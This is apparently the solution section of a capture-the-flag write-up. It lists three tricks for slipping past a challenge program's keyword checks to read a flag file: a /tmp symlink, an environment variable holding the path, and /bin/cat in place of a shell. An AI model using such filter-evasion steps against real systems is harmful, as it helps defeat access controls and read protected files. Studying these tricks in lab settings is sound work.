0x02 Solution

  • ln -s ~/flag /tmp/flag can bypass the 'flag' checking.

  • Add fp=/tmp/flag to environment can bypass the 'tmp' checking.

  • Using /bin/cat rather than /bin/bash or /bin/sh can bypass the 'sh' checking.
